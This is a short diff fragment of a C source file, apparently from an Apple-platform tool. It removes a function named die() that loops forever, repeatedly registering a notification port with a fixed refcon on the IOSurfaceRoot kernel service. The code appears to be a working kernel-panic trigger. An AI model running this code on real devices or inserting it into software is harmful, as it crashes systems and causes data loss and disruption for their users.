@@ -1458,20 +1458,3 @@ out:;
     }
     return retval;
 }
-
-void die(){
-    // open user client
-    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
-    io_connect_t connect = 0;
-    IOServiceOpen(service, mach_task_self(), 0, &connect);
-    
-    // add notification port with same refcon multiple times
-    mach_port_t port = 0;
-    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    uint32_t references;
-    uint64_t input[3] = {0};
-    input[1] = 1234;  // keep refcon the same value
-    while (1)
-        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
-}
